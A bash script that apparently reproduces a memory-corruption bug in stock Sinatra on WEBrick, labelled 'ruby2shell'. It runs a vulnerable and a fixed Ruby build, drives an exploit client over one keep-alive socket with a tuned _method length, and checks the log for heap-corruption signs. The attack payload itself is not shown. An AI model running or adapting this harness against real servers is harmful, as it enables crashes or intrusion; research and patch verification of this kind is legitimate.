#!/bin/bash
# Stock Sinatra + WEBrick: three HTTP/1.1 requests on ONE keep-alive socket.
# No middleware, debugger write or memory oracle in the request path.
# Optional third argument selects the _method length N (default 572).
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-webrick-keepalive-$MODE}"
N="${3:-572}"
case "$MODE" in
  fixed) RB=lab/build/plain/ruby-3.4.13-plain/bin/ruby ;;
  *)     RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby ;;
esac
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
EV=lab/build/evidence
OUT="$EV/stock-baseline-$TAG.out"
LOG="$EV/stock-baseline-$TAG.server.log"
PORT=4551
export RUBY2SHELL_STOCK_PORT="$PORT"
export RUBY2SHELL_KEEP_FILL="${RUBY2SHELL_KEEP_FILL:-48}"
mkdir -p "$EV"
"$RB" lab/repro/ruby2shell-stock-baseline.ru -s webrick > "$LOG" 2>&1 &
PID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then READY=YES; break; fi
  sleep 0.1
done
python3 lab/repro/ruby2shell-webrick-keep-client.py "$MODE" "$RUBY2SHELL_KEEP_FILL" "$PORT" "$N" > "$OUT" 2>&1
sleep 1
if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
kill "$PID" 2>/dev/null
wait "$PID" 2>/dev/null
RC=$?
echo "== $TAG mode=$MODE n=$N fill=$RUBY2SHELL_KEEP_FILL ruby=$RB ready=$READY"
cat "$OUT"
echo "allocator-diagnostic: $(grep -E 'corrupted|malloc\(\)|free\(\)|double free|invalid|Segmentation' "$LOG" 2>/dev/null | tr '\n' ';')"
echo "process-alive-after-keepalive=$ALIVE server-rc=$RC"
